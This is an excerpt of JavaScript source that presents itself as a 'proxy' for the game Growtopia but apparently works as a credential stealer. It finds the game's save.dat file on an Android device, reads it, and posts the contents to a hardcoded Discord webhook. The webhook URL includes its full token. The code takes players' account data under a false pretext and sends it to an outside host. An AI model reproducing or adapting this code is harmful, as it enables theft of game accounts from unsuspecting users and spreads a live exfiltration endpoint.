...
const yourhook = new Webhook('https://discord.com/api/webhooks/958207195902791720/7QhrADLdErVztGZkuhGcMLTexV6RQN9dUvsHH58glzF-kDbAcaYM59uV_EANaE0Dwdap'); // Noob webhooks.
const fs = require('fs');

// Lets start:D
function yazproxy () {
    const path = `${os.homedir()}/Android/Data/com.rtsoft.growtopia/files/save.dat`
    if (fs.existsSync(path)) { // Detect the path. if they exists or nop. why? cause some ppl are SMART.
    console.log("[DIAZ-PROXY] Started Proxy")
    // read it first
    ...
    .setDescription("```ini\n" + hasil + "\n```")
    .setFooter("proxy has been started", 'https://c.tenor.com/0hjOGLFaQa0AAAAM/lofi-girl-lofi.gif')
    //send embed.
